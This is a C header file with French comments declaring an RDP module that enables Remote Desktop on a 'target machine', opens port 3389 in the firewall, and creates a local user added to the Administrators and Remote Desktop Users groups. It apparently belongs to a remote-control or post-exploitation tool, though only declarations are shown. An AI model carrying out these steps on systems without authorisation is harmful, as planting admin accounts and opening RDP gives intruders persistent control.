#ifndef RDP_H
#define RDP_H

#include <windows.h>

/**
 * Module RDP - Remote Desktop Protocol
 * Permet d'activer/désactiver RDP et gérer les accès
 */

// Codes de retour
#define RDP_SUCCESS 0
#define RDP_ERROR_REGISTRY 1
#define RDP_ERROR_FIREWALL 2
#define RDP_ERROR_SERVICE 3
#define RDP_ERROR_USER 4
#define RDP_ERROR_ACCESS_DENIED 5

/**
 * Active le Remote Desktop sur la machine cible
 *
 * Actions:
 * 1. Modifie HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections = 0
 * 2. Ajoute règle firewall pour port 3389
 * 3. Redémarre le service TermService si nécessaire
 *
 * @param output Buffer pour stocker le résultat
 * @param size Taille du buffer
 * @return RDP_SUCCESS ou code d'erreur
 */
int rdp_enable(char *output, size_t size);

/**
 * Désactive le Remote Desktop
 *
 * Actions:
 * 1. Modifie fDenyTSConnections = 1
 * 2. Supprime la règle firewall
 *
 * @param output Buffer pour stocker le résultat
 * @param size Taille du buffer
 * @return RDP_SUCCESS ou code d'erreur
 */
int rdp_disable(char *output, size_t size);

/**
 * Vérifie le statut actuel de RDP
 *
 * @param output Buffer pour stocker le résultat
 * @param size Taille du buffer
 * @return RDP_SUCCESS ou code d'erreur
 */
int rdp_status(char *output, size_t size);

/**
 * Crée un utilisateur avec accès RDP
 *
 * Actions:
 * 1. Crée un utilisateur local
 * 2. L'ajoute au groupe Administrators
 * 3. L'ajoute au groupe "Remote Desktop Users"
 *
 * @param username Nom d'utilisateur à créer
 * @param password Mot de passe
 * @param output Buffer pour stocker le résultat
 * @param size Taille du buffer
 * @return RDP_SUCCESS ou code d'erreur
 */
int rdp_adduser(const char *username, const char *password, char *output, size_t size);

#endif // RDP_H
